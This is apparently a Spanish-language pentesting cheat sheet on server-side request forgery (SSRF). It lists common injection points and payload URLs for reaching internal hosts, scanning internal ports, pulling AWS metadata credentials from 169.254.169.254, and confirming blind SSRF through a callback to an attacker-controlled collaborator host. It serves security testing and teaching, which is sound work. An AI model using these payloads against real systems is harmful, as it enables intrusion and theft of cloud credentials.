# SSRF (Server-Side Request Forgery)

## Descripción

La vulnerabilidad **SSRF (Server-Side Request Forgery)** ocurre cuando una aplicación permite que un atacante **manipule peticiones realizadas por el servidor**, lo que puede llevar a la exfiltración de datos internos, escaneo de puertos o incluso ejecución de código remoto en algunos casos.

SSRF es particularmente peligroso en entornos donde hay servicios internos sensibles, como **AWS metadata**, bases de datos internas o API de administración expuestas.

---

## Lugares comunes donde buscar SSRF

### Parámetros de entrada que aceptan URLs
- **Campos de entrada de imágenes** (Carga de imágenes desde una URL)
- **Webhooks** (URL proporcionadas por el usuario)
- **Integraciones de APIs** (Ejemplo: integración con servicios externos)
- **Redirecciones de contenido** (Como un proxy o un previsualizador de enlaces)
- **Servicios de conversión de archivos**
- **Sistemas de previsualización de sitios web**

---

## Explotación de SSRF

### 1. Acceso a recursos internos
*Prueba a ingresar direcciones internas en los parámetros sospechosos:*
```bash
http://127.0.0.1:8000/admin
http://localhost:8080/private
http://192.168.1.1/
http://[::1]/
```

### 2. Escaneo de puertos internos
```bash
http://target.com/?url=http://127.0.0.1:22
http://target.com/?url=http://127.0.0.1:3306
```
*Si las respuestas varían, es posible que los puertos estén abiertos.*

### 3. Exfiltración de metadatos en AWS
```bash
http://169.254.169.254/latest/meta-data/
```
*Esto permite obtener claves sensibles en entornos AWS.*

### 4. Realización de ataques blind SSRF
Si no hay respuesta visible, intenta enviar peticiones a un **colaborador externo** como [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) o un servidor controlado por ti:
```bash
http://your-burp-collaborator.com
```
*Si recibes una conexión, hay un SSRF presente.*

## Herramientas recomendadas
- **Burp Suite**: Intercepción y manipulación de peticiones.
- **FFUF**: Fuzzing de parámetros para descubrir posibles puntos de entrada.
- **Gopherus**: Generación de payloads avanzados para SSRF.
- **Metasploit**: Módulos para explotación automatizada.
